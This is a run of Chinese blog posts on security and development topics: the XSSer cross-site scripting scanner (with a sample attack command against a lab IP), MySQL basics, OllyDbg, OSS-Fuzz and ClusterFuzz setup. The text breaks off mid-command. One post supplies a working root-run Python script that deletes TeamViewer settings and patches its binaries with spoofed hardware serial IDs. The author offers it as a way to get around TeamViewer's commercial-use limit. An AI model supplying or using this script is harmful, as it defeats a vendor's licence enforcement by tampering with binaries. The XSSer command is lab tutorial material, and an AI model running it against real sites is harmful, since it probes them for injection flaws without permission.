XSSer\n\nXSSer是一种自动框架，用于检测，利用和报告基于Web的应用程序中的XSS漏洞。它包含几个试图绕过某些过滤器的选项，以及各种特殊的代码注入技术。\n\n下图是OWASP中所列XSSer的运作流程：\n\n![image-20190825094756457](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bomjsj42j314p0u0thz.jpg)\n\nXSSer可在许多平台上运行。它需要Python和以下库：\n\n```python\n- python-pycurl - Python bindings to libcurl\n- python-xmlbuilder - create xml/(x)html files - Python 2.x\n- python-beautifulsoup - error-tolerant HTML parser for Python\n- python-geoip - Python bindings for the GeoIP IP-to-country resolver library\n```\n\n若在基于Debian的系统上安装需要：\n\n```\nsudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip\n```\n\n利用\"xsser -h\"可以列出所有功能XSSer包：\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g6booea5q7j30jc0cv3zo.jpg)\n\n若要发起简单的XSS注入攻击可用：\n\n```\nroot @ kali ：〜＃xsser -u“http://192.168.169.130/xss/example1.php?name=hacker”\n```\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bopcyo2ij30jc0g3ta7.jpg)\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bopzvbulj30jc0g375l.jpg)\n\nXSSer的主要特点是：\n\n-   使用GET和POST方法注入。\n\n-   包括各种过滤器和旁路技术。\n\n-   可以与命令行和GUI一起使用。\n\n-   将提供详细的攻击统计数据。\n\n**5.2 工具二 XSSfork（**[[https://paper.seebug.org/359/]{.underline}](https://paper.seebug.org/359/)**）//5月7日**\n\nxssfork 作为 sicklescan 的一个功能模块，其开发主要目的是用于检测 xss 漏洞。\n","tags":["个人总结"],"categories":["web"]},{"title":"认识sql并学习数据库的基础操作","url":"/2021/01/25/认识sql并学习数据库基础操作/","content":"\n\n\n# 关系型数据库与非关系型数据库的区别\n\n**数据库**，简而言之可视为电子化的文件柜——存储电子文件的处所，用户可以对文件中的数据运行新增、截取、更新、删除等操作。\n\n所谓“数据库”系以**一定方式**储存在一起、能予多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。一个数据库由多个表空间（Tablespace）构成。\n\n<!-- more -->\n\n## 关系型数据库\t\t\t\n\n\n\n![image-20190809213135889](http://ww1.sinaimg.cn/large/006y8mN6ly1g67e4anfl6j30ae05bt8x.jpg)\n\n关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织\n\n**优点：**\n\n1、易于维护：都是使用表结构，格式一致；\n2、使用方便：SQL语言通用，可用于复杂查询；\n3、复杂操作：支持SQL，可用于一个表以及多个表之间非常复杂的查询。\n\n**缺点：**\n\n1、读写性能比较差，尤其是海量数据的高效率读写；                                                                                    \t\t\t\t2、固定的表结构，灵活度稍欠；\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t3、高并发读写需求，传统关系型数据库来说，硬盘I/O是一个很大的瓶颈。\n\n## 非关系型数据库\n\n![image-20190809213436309](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e4d0wlmj30a105474m.jpg)\n\n非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。\n\n**优点：**\n\n1、格式灵活：存储数据的格式可以是key,value形式、文档形式、图片形式等等，文档形式、图片形式等等，使用灵活，应用场景广泛，而关系型数据库则只支持基础类型。\n2、速度快：nosql可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘；\n3、高扩展性；\n4、成本低：nosql数据库部署简单，基本都是开源软件。\n\n**缺点：**\n\n1、不提供sql支持，学习和使用成本较高；\n2、无事务处理；\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t3、数据结构相对复杂，复杂查询方面稍欠。\n\n# 学习关系型数据库——MySQL\n\nMySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。\n\n- MySQL 是开源的，所以你不需要支付额外的费用。\n- MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。\n- MySQL 使用标准的 SQL 数据语言形式。\n- MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。\n- MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。\n- MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。\n- MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统\n\n上一周的任务中，我在Docker容器中已经成功安装了Mysql，这里我在终端先进入容器中的mysql\n\n```\ndocker exec -it mymysql bash   //mymysql是我的sql容器名字\nmysql -uroot -p\n```\n\n![image-20190809214931461](http://ww2.sinaimg.cn/large/006y8mN6ly1g67e4aelscj31hc0kkgsj.jpg)\n\n此时己成功进入sql容器中\n\n## 创建一个数据库\n\n我们可以在登陆 MySQL 服务后，使用 **create** 命令创建数据库，语法如下:\n\n```\nCREATE DATABASE 数据库名;\n```\n\n这里我们创建一个test1的数据库进行进一步操作，随后我们通过\n\n```\nshow databases；\n```\n\n发现创建成功\n\n![image-20190809215629066](http://ww1.sinaimg.cn/large/006y8mN6ly1g67e48vbzyj30qo06xt9b.jpg)\n\n## 创建数据表\n\n创建MySQL数据表需要以下信息：\n\n- 表名\n- 表字段名\n- 定义每个表字段\n\n以下为创建MySQL数据表的SQL通用语法：\n\n```\nCREATE TABLE table_name (column_name column_type);\n```\n\n首先我们选择test1数据库，在其中创建一张Fstark表\n\n```\nuse test1;\n```\n\n```\nCREATE TABLE Fstark(\n   fstark_id INT UNSIGNED AUTO_INCREMENT,\n   fstark_title VARCHAR(100) NOT NULL,\n   fstark_author VARCHAR(40) NOT NULL,\n   submission_date DATE,\n   PRIMARY KEY ( fstark_id )\n)ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n实例解析：\n\n- 如果你不想字段为 **NULL** 可以设置字段的属性为 **NOT NULL**， 在操作数据库时如果输入该字段的数据为**NULL** ，就会报错。\n\n- AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。\n\n- PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。\n\n- ENGINE 设置存储引擎，CHARSET 设置编码。\n\n  ![image-20190809220838586](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e4b91z8j30a606xmxp.jpg)\n\n  通过`show tables；`命令发现创建成功。\n\n  ## 在表内添加数据\n\n  MySQL 表中使用 **INSERT INTO** SQL语句来插入数据。可以通过 mysql> 命令提示窗口中向数据表中插入数据\n\n  ```\n  INSERT INTO Fstark \n      (fstark_title, fstark_author, submission_date)\n      VALUES\n      (\"test1234\", \"Fstark\", NOW());\n  ```\n\n![image-20190809222929413](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e4brmxvj30q80egmzl.jpg)\n\n## \twhere查询语句\n\n​\t以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：\n\n```\nSELECT field1, field2,...fieldN FROM table_name1, table_name2...\n[WHERE condition1 [AND [OR]] condition2.....\n```\n\n- 查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。\n\n- 你可以在 WHERE 子句中指定任何条件。\n\n- 你可以使用 AND 或者 OR 指定一个或多个条件。\n\n- WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。\n\n- WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。\n\n  我来查找刚刚创建的表中，author为Fstark的数据，看是否可以查找成功\n\n  ```\n  SELECT * from Fstark WHERE fstark_author='fstark';\n  ```\n\n  \n\n![image-20190809223431842](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e4clkioj30q807s3zz.jpg)\n\n这里已经查询成功，细心的可能已经发现，我这里where查询语句对于大小写是不敏感的，可以使用 BINARY \t\t\t\t\t关键字来设定 WHERE 子句的字符串比较是区分大小写的，比如：\n\n```\nSELECT * from Fstark WHERE BINARY fstark_author='fstark';\n```\n\n就没有结果，但是若换成：\n\n```\nSELECT * from Fstark WHERE BINARY fstark_author='Fstark';\n```\n\n既查询成功。\n\n![image-20190809223726840](http://ww2.sinaimg.cn/large/006y8mN6ly1g67e49d8r8j30q808qgnb.jpg)\n\n##\t\t删除表单\n\n​\t以下为删除MySQL数据表的通用语法：\n\n```\nDROP TABLE table_name ;\n```\n\n##\t\t删除数据库\n\n​\t在删除数据库过程中，务必要十分谨慎，因为在执行删除命令后，所有数据将会消失。\n\n​\tdrop 命令格式：\n\n```\ndrop database <数据库名>;\n```\n\n#\t\tMySQL数据类型\n\n​\tMySQL中定义数据字段的类型对你数据库的优化是非常重要的。\n\nMySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。\n\n## 数值类型\n\nMySQL支持所有标准SQL数值数据类型。\n\n这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。\n\n关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。\n\nBIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。\n\n作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。\n\n| 类型         | 大小                                     | 范围（有符号）                                               | 范围（无符号）                                               | 用途            |\n| ------------ | ---------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | --------------- |\n| TINYINT      | 1 字节                                   | (-128，127)                                                  | (0，255)                                                     | 小整数值        |\n| SMALLINT     | 2 字节                                   | (-32 768，32 767)                                            | (0，65 535)                                                  | 大整数值        |\n| MEDIUMINT    | 3 字节                                   | (-8 388 608，8 388 607)                                      | (0，16 777 215)                                              | 大整数值        |\n| INT或INTEGER | 4 字节                                   | (-2 147 483 648，2 147 483 647)                              | (0，4 294 967 295)                                           | 大整数值        |\n| BIGINT       | 8 字节                                   | (-9,223,372,036,854,775,808，9 223 372 036 854 775 807)      | (0，18 446 744 073 709 551 615)                              | 极大整数值      |\n| FLOAT        | 4 字节                                   | (-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38) | 0，(1.175 494 351 E-38，3.402 823 466 E+38)                  | 单精度 浮点数值 |\n| DOUBLE       | 8 字节                                   | (-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) | 0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) | 双精度 浮点数值 |\n| DECIMAL      | 对DECIMAL(M,D) ，如果M>D，为M+2否则为D+2 | 依赖于M和D的值                                               | 依赖于M和D的值                                               | 小数值          |\n\n## 日期和时间类型\n\n表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。\n\n每个时间类型有一个有效值范围和一个\"零\"值，当指定不合法的MySQL不能表示的值时使用\"零\"值。\n\nTIMESTAMP类型有专有的自动更新特性，将在后面描述。\n\n| 类型      | 大小 (字节) | 范围                                                         | 格式                | 用途                     |\n| --------- | ----------- | ------------------------------------------------------------ | ------------------- | ------------------------ |\n| DATE      | 3           | 1000-01-01/9999-12-31                                        | YYYY-MM-DD          | 日期值                   |\n| TIME      | 3           | '-838:59:59'/'838:59:59'                                     | HH:MM:SS            | 时间值或持续时间         |\n| YEAR      | 1           | 1901/2155                                                    | YYYY                | 年份值                   |\n| DATETIME  | 8           | 1000-01-01 00:00:00/9999-12-31 23:59:59                      | YYYY-MM-DD HH:MM:SS | 混合日期和时间值         |\n| TIMESTAMP | 4           | 1970-01-01 00:00:00/2038结束时间是第 **2147483647** 秒，北京时间 **2038-1-19 11:14:07**，格林尼治时间 2038年1月19日 凌晨 03:14:07 | YYYYMMDD HHMMSS     | 混合日期和时间值，时间戳 |\n\n## 字符串类型\n\n字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。\n\n| 类型       | 大小                | 用途                            |\n| ---------- | ------------------- | ------------------------------- |\n| CHAR       | 0-255字节           | 定长字符串                      |\n| VARCHAR    | 0-65535 字节        | 变长字符串                      |\n| TINYBLOB   | 0-255字节           | 不超过 255 个字符的二进制字符串 |\n| TINYTEXT   | 0-255字节           | 短文本字符串                    |\n| BLOB       | 0-65 535字节        | 二进制形式的长文本数据          |\n| TEXT       | 0-65 535字节        | 长文本数据                      |\n| MEDIUMBLOB | 0-16 777 215字节    | 二进制形式的中等长度文本数据    |\n| MEDIUMTEXT | 0-16 777 215字节    | 中等长度文本数据                |\n| LONGBLOB   | 0-4 294 967 295字节 | 二进制形式的极大文本数据        |\n| LONGTEXT   | 0-4 294 967 295字节 | 极大文本数据                    |\n\nCHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。\n\nBINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。\n\nBLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。\n\n有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。","tags":["Sql"],"categories":["web"]},{"title":"OllyDbg初步学习总结与简单实战","url":"/2021/01/25/OllyDbg/","content":"\n### OllyDbg核心功能介绍\n\nOllyDbg（简称OD）是有Oleh Yuschuuk编写的一款具有可视化界面的用户模式调试器，可以在当前各种Windows版本上运行，但NT的系统架构更能发挥OllyDbg强大功能。OllyDbg结合了动态调试和静态分析，具有GUI界面，易上手，并且对异常的跟踪处理相当灵活，这些使得OllyDbg成为调试Ring 3级程序的首选工作。它的反汇编引擎很强大，可识别数千个被C和Windows频繁使用的函数，并能将其参数注释出。它会自动分析函数过程、循环语句、代码中的字符串等。\n\n<!-- more -->\n\n###  OllyDbg加载自编译HelloWorld程序\n\nOllydbg加载程序之后，首先断在程序的入口点（EP），但这并不是main()函数的入口。一个比较简单的在Ollydbg中定位main()函数的方法就是找到call GetCommandLineA()之后继续往下找，接连三个压栈操作之后的call指令就是main()函数调用。进入之后就是main()函数的反汇编指令。\n\n ![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehexmxevoj30n00c4e81.jpg)\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehexyp8yvj30k40gsnpd.jpg) \n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g7544sc00mj31ad0kr7c0.jpg) \n\n###  OllyDbg分析真实程序\n\n下面以windows中自带的记事本为例，利用OllyDbg进行一次简单的分析。首先将记事本Notepad.exe拉到OllyDbg中，打开后主界面如下图所示。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g7544z4o8lj31fc0u0q5g.jpg) \n\n这个整体的大窗口就是CPU窗口，总体由四部分组成。\n\n首先第1部分就是反汇编窗口，反汇编部分由4个区域组成,最左边的是地址区域,显示了对应的指令在程序的内存空间中的地址(虚拟地址).其次是机器码,显示了这条汇编指令所对应的机器码,第3个区域是反汇编区,显示的是反汇编指令,第4个区域是注释区域,Ollydbg会在该区域自动添加一些注释,例如函数的参数提示等,鼠标在上面双击可以添加自己的注释.\n\n第2部分就是寄存器区，显示了当前所选线程的CPU寄存器内容。\n\n第3部分是内存数据窗口,以16进制和ASCII码形式显示程序的内存数据.\n\n第4部分为堆栈窗口，它显示了当前线程的栈。\n\n我们通过查询得知，记事本保存文件就是调用了Kernel32中的WriteFile。我们以此为目标设置断点。鼠标右键—>查找—>所有模块间的调用—>点击目标文件从上至下进行排序—>查找“Writefile”—>右键“在每个调用到WriteFile上设置断点”。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g75454gs4oj31f20pa75i.jpg) \n\n点击运行后，在记事本内随意输入测试内容文字然后保存；点击“保存”按钮后，程序中断在01004C2A处的WriteFile；\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g75459aa1sj30lu04it8r.jpg) \n\n此时观察右下角的堆栈窗口，发现了输入的测试内容“testtest12345”.\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g75479cebgj30n20cwdjl.jpg) \n\n则本次调试结束，关闭窗口保存调试结果。\n\n###  OllyDbg常用命令总结\n\n| **快捷键** | **功    能**               | **说明**                                                     |\n| ---------- | -------------------------- | ------------------------------------------------------------ |\n| **F8**     | 单步执行                   | 遇到函数调用指令不跟入(Step over)                            |\n| **F7**     | 单步执行                   | 遇到函数调用指令跟入(Step in)                                |\n| **F2**     | 设置断点                   | 在一条指令上设置断点                                         |\n| **F4**     | 执行到当前光标所选中的指令 | 在遇到循环时可以方便地执行到循环结束位置                     |\n| **F9**     | 运行程序                   | 运行程序直到遇到断点                                         |\n| **Ctrl+G** | 查看任意位置的数据         | 在指令区、栈区、内存区都可以使用，可以方便地查看任意位置的指令和数据 |\n| **CTR+F9** | 执行到返回。               | 此命令在执行到一个 ret (返回指令)指令时暂停，常用于从系统区域返回到我们调试的程序区域。 |\n| **ALT+F9** | 执行到用户代码。           | 可用于从系统区域快速返回到我们调试的程序区域。               |\n\n \n\n###  OllyDbg插件使用\n\n插件是一个DLL文件，存放在OllyDbg的目录中，用于增加OllyDbg的功能。 你可以从OllyDbg的主页上( http://home.t—online.de/home/Ollydbg)免费下载插件开发工具包plug110.zip。 \n\n插件可以设置断点，增加标签和注释，修改寄存器和内存。插件可以添加到主菜单和很多的窗口(比如反汇编窗口、内存窗口)的快捷菜单中，也可以拦截快捷键。插件还可以创建MDI(多文档界面)窗口。插件还可以根据模块信息和 OllyDbg.ini文件，将自己数据写到.udd文件中;并能读取描述被调试程序的各种数据结构。插件API包含了多达170个函数。 \n\nOllyDbg的插件安装简单，使用方便。将下载的插件压缩包解压到OllyDbg的安装目录下的 PLUGIN 目录中就可以了，然后重启OllyDbg会自动识别，在Plugins菜单下即可看到新装的插件；一般是一个dll文件，有的可能还有一个ini配置文件。要注意的是 OllyDBG 1.10 对插件的个数有限制，最多不能超过 32 个，否则会出错，因此建议插件不要添加的太多。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g7547imda1j30y60c874d.jpg) ","tags":["个人总结"],"categories":["二进制"]},{"title":"mac系统Teamview去除商业版限制","url":"/2021/01/25/teamview去除5分钟/","content":"\n用来去除macos上Teamview的商业版限制\n\n<!-- more -->\n\n最近几个月天天用Teamview，不出所料的被商业版了。扒了扒网上的方法，重装清注册表的，还有就是win下那个换ID的启动器可惜mac用不了，在github上找到一个TeamViewer ID Changer for MAC OS挺长时间没更新了，里面文件的位置都变了也用不了，简单改了改现在的最新版本可以使用，使用root用户运行后重启登陆就可以了。\n\n```python\n#!/usr/bin/env python \n\n#coding:utf-8\nimport sys\nimport os\nimport glob\nimport platform\nimport re\nimport random\nimport string\n\nprint('''\n--------------------------------\nTeamViewer ID Changer for MAC OS\n--------------------------------\n''')\n\nif platform.system() != 'Darwin':\n    print('This script can be run only on MAC OS.')\n    sys.exit();\n\nif os.geteuid() != 0:\n    print('This script must be run form root.')\n    sys.exit();\n\nif os.environ.has_key('SUDO_USER'):\n    USERNAME = os.environ['SUDO_USER']\n    if USERNAME == 'root':\n       print('Can not find user name. Run this script via sudo from regular user')\n       sys.exit();\nelse:\n    print('Can not find user name. Run this script via sudo from regular user')\n    sys.exit();\n\nHOMEDIRLIB = '/Users/' + USERNAME  + '/library/preferences/'\nGLOBALLIB  =  '/library/preferences/'\n\nCONFIGS = []\n\n# Find config files\n\ndef listdir_fullpath(d):\n    return [os.path.join(d, f) for f in os.listdir(d)]\n\nfor file in listdir_fullpath(HOMEDIRLIB):\n    if 'teamviewer'.lower() in file.lower():\n        CONFIGS.append(file)\n\nif not CONFIGS:\n    print ('''\nThere is no TemViewer configs found.\nMaybe you have deleted it manualy or never run TeamViewer after installation.\nNothing to delete.\n''')\n# Delete config files\nelse:\n    print(\"Configs found:\\n\")\n    for file in CONFIGS:\n        print file\n\n    print('''\nThis files will be DELETED permanently.\nAll TeamViewer settings will be lost\n''')\n    raw_input(\"Press Enter to continue or CTR+C to abort...\")\n\n    for file in CONFIGS:\n        try:\n            os.remove(file)\n        except:\n            print(\"Cannot delete config files. Permission denied?\")\n            sys.exit();\n    print(\"Done.\")\n\n# Find binaryes\n\nTMBINARYES = [\n'/Applications/TeamViewer.app/Contents/MacOS/TeamViewer',\n'/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Service',\n'/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Desktop',\n]\n\nfor file in TMBINARYES:\n    if os.path.exists(file):\n        pass\n    else:\n        print(\"File not found: \" + file)\n        print (\"Install TeamViewer correctly\")\n        sys.exit();\n\n# Patch files\n\ndef idpatch(fpath,platf,serial):\n    file = open(fpath, 'r+b')\n    binary = file.read()\n    PlatformPattern = \"IOPlatformExpert.{6}\"\n    SerialPattern =  \"IOPlatformSerialNumber%s%s%sUUID\"\n\n    binary = re.sub(PlatformPattern, platf, binary)\n    binary = re.sub(SerialPattern % (chr(0), \"[0-9a-zA-Z]{8,8}\", chr(0)), SerialPattern%(chr(0), serial, chr(0)), binary)\n\n    file = open(fpath,'wb').write(binary)\n    return True\n\ndef random_generator(size=8, chars=string.ascii_uppercase + string.digits):\n    return ''.join(random.choice(chars) for _ in range(size))\n\nRANDOMSERIAL = random_generator()\nRANDOMPLATFORM = \"IOPlatformExpert\" + random_generator(6)\n\n\nfor file in TMBINARYES:\n        try:\n            idpatch(file,RANDOMPLATFORM,RANDOMSERIAL)\n        except:\n            print \"Error: can not patch file \" + file\n            print \"Wrong version?\"\n            sys.exit();\n\nprint \"PlatformDevice: \" + RANDOMPLATFORM\nprint \"PlatformSerial: \" + RANDOMSERIAL\n\nprint('''\nID changed sucessfully.\n!!! Restart computer before using TeamViewer !!!!\n''')\n```\n\n","tags":["小脚本"],"categories":["其他"]},{"title":"OSS-fuzz资料收集","url":"/2021/01/25/oss-fuzz/","content":"\n\n\n# 1. 概述\n\nOSS-Fuzz 接受的项目都是需要有庞大的用户基数或者对于IT基础设施有重大的影响。现在来看，已经有了300多个开源项目\n\n<!-- more -->\n\n## 1.1 能力边界\nOSS-Fuzz 的能力边界在哪里?\n\n## 2 如何配置添加项目\n以下是先决条件\n1. 编写需要Fuzz目标功能模块的hardness[^1][^2]\n2. 使用docker容器\n每个OSS-Fuzz的项目都有一个子目录，每个项目目录还包含以下三个配置文件： \n\nproject.yaml - 提供有关项目的元数据 .\nDockerfile - 使用构建项目及其模糊目标所需的依赖项信息来定义容器环境 .\nbuild.sh - 定义在Docker容器内执行的构建脚本并生成项目构建.\n\n## 3. 现有支持项目情况简介(节选)\n这个列表先节选平时软件引用比较多的开源软件基础库。\n|序号|项目名称|输入文件|处理类型|功能描述|\n|:--:|:--:|:--:|:--:|:--:|\n|1| libpng|png文件| 图像处理| 处理png文件解析|\n|2| FreeImage|多种图片文件| 图像处理| 处理图像文件解析|\n|3| libpcap|pcap文件| 网络数据包处理| 处理网络数据包|\n|4| giflib|gif文件| 图像处理|处理gif文件解析|\n|5| freetype|字体文件| 图像处理|处理字体解析|\n|6| libexif|exif文件| 图像处理|处理exif图像文件解析|\n|7| arrow|ipc文件| 进程间通信处理|处理ipc进程通信文件解析|\n|8| Aspell|文档字符| 文字处理|针对输入文本拼写进行检查|\n|9| file|多种格式文件| 文件处理|处理并判断各种文件类型|\n|10| libxls|Excel文件| Excel处理|处理Excel文件解析|\n|11| mpg123|MPEG文件| 视频处理|处理MPEG文件解析|\n|12| libhtp|pcap文件| 网络数据包处理|处理HTTP协议解析|\n|13| libtiff|tiff文件| 图像处理|处理tiff图像解析|\n|14| libmpeg2|mpeg2文件| 视频处理|处理mpeg2视频解析|\n|15| libzip|zip文件| 压缩包处理|处理zip包解析|\n|16| libtorrent|torrent文件| bt种子处理|处理bt种子文件解析|\n|17| libfdk-aac |aac文件| 音频处理 |处理无损aac音频解析|\n|18| libass |ass文件| 视频字幕处理 |处理视频中ass字幕解析|\n|19| libjpeg-turbo |jpeg文件| 图像处理 |处理jpeg图片文件解析|\n|20| mupdf |pdf文件| 文件处理 |处理pdf文件解析|\n|21| libldac |ldac文件| 音频处理 |处理ldac编码音频解析|\n|22| libusb |usb信息| 串口处理 |处理usb串口信息解析|\n|23| libvips |多种图片文件| 图像处理 |处理图像文件解析|\n|24| libwebp |webp文件| 图像处理 |处理webp文件解析|\n|25| libxml2 |xml文件| 网页处理 |处理xml网页文件解析|\n\n# FF.参考链接\n[^1]: [boringssl的hardness参考](https://github.com/google/boringssl/tree/master/fuzz)\n[^2]: [Sqlite的hardness参考](https://www.sqlite.org/src/artifact/ad79e867fb504338)\n\nFirst Header | Second Header | Third Header\n:----------- | :-----------: | -----------:\n Left        |     Center    |       Right\n","tags":["个人总结","fuzz"],"categories":["二进制"]},{"title":"clusterfuzz踩坑指南","url":"/2021/01/25/clusterfuzz踩坑指南/","content":"\n\n\n本文是初次使用clusterfuzz的踩坑指南，项目去年上半年刚开源，资料、博客都比较少，随时更新随时补充～\n\n<!-- more -->\n\n### clusterfuzz介绍\n\n google 之前推出了 [OSS-Fuzz](https://github.com/google/oss-fuzz) 服务，用于给开源项目的进行免费的模糊测试服务，可自动在新版本代码提交后自动完成 **测试->异常检测->issue登记->老版本issue回归及自动关闭** 的功能。其实就是基于 ClusterFuzz ，技术图如下：\n\n![image-20200516222340997](https://tva1.sinaimg.cn/large/007S8ZIlly1geunooukvij30nk0cl41e.jpg)\n\n\n\nClusterFuzz官方定义是“ClusterFuzz is a scalable fuzzing infrastructure which finds security and stability issues in software.”。 它的结构主要分为AppEngine 和 Bots pool两个部分，定义里的scalable 就是体现在这个Bots pool，原则上可以运行多个bots从而形成一个集群；Fuzz部分是在Bot中运行，主要是由第三方工具支持，如libFuzzer、AFL及其他的blackbox fuzzer，所以ClusterFuzz更是一个模糊测试的管理工具。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geunq5ua73j30hw0b0q3c.jpg)\n\n**App Engine：**是提供Web接口访问，如访问crashes和统计分析等；也负责任务的调度，主要就是调度执行Bot\n\n**Bot：**这是测试的主要执行模块，涵盖模糊测试，语料库，分析等。\n\n之前的clusterfuzz只能部署在Google Cloud 上，现在开源后也可以部署在本地。根据官方介绍，它具备如下功能：\n\n- 高度可扩展，谷歌的内部实例运行在超过 25000 台机器上\n- 准确的去副本化（Accurate deduplication）\n- 问题跟踪器的全自动错误归档和关闭\n- 最小化测试用例\n- 通过二分法回归查找\n- 提供分析 fuzzer 性能和崩溃率的统计信息（不支持本地部署）\n- 易于使用的 Web 界面，用于管理和查看崩溃\n- 支持引导模糊（例如 libFuzzer 和 AFL）和黑盒模糊测试\n\n其基本的执行流程就是如下图所示\n\n![image-20200516222925627](https://tva1.sinaimg.cn/large/007S8ZIlly1geunumrd9qj30jp09qmy7.jpg)\n\n基于此，参照一些教程和官方博客尝试在我的小mac上搭建跑一下。请注意，目前本地部署仅支持mac和linux，其中mac还被官方标注为“尝试性”的，可能会遇到意料之外的issue\n\n### 本地部署\n\n请注意：本项目大量依赖Google服务，强烈建议提前设置代理软件，大部分issue都与此有关，如果条件允许直接在路由器代理效果最好\n\n**mac命令行代理**\n\n给git设置全局代理\n\n```bash\ngit config --global http.proxy socks5://127.0.0.1:1080\n```\n\n仅github代码库走代理，国内git库不走\n\n```bash\ngit config --global http.https://github.com.proxy socks5://127.0.0.1:1080\n```\n\n移除上面设置的git代理\n\n```bash\ngit config --global --unset http.proxy\ngit config --global --unset http.https://github.com.proxy\n```\n\n终端全代理\n\n```bash\nexport http_proxy=http://127.0.0.1:1080;\nexport https_proxy=http://127.0.0.1:1080;\n```\n\n**路由代理**\n\n买个华硕/网件路由刷老毛桃/潘多拉/梅林刷fancyss\n\n```http\nhttps://github.com/hq450/fancyss\n```\n\n#### 环境搭建\n\n##### git源码\n\n首先把源码先下载到本地\n\n```bash\ngit clone https://github.com/google/clusterfuzz\n```\n\n官方建议使用我们代码的[最新发行版](https://github.com/google/clusterfuzz/releases/latest)（而不是master分支）。您可以使用以下命令签出特定版本：\n\n```bash\ngit checkout tags/vX.Y.Z\n```\n\n其中XYZ是发行版本（例如1.0.1）\n\n![截屏2020-05-15 下午9.36.10](https://tva1.sinaimg.cn/large/007S8ZIlly1geuol766paj30w40eiq6m.jpg)\n\n##### 安装并配置Google Cloud SDK\n\n按照[在线说明](https://cloud.google.com/sdk/)安装Google Cloud SDK ，mac 下可直接用解压后的 `install.sh` 脚本一键安装\n\n![image-20200516225901713](https://tva1.sinaimg.cn/large/007S8ZIlly1geuopf7sk3j30vs0eitbf.jpg)\n\n这里请记得配置身份文件，否则最后运行时会报错。在[“创建服务帐号密钥”页面](https://console.cloud.google.com/apis/credentials/serviceaccountkey?_ga=2.81690135.165030320.1589549867-1464700725.1589549867)里申请json文件，通过设定环境变量 GOOGLE_APPLICATION_CREDENTIALS，向您的应用代码提供身份验证凭据。将 [PATH] 替换为包含您服务帐号密钥的 JSON 文件的路径。此变量仅适用于当前的 shell 会话，因此，如果您打开新的会话，请重新设置该变量。\n\n```bash\nexport 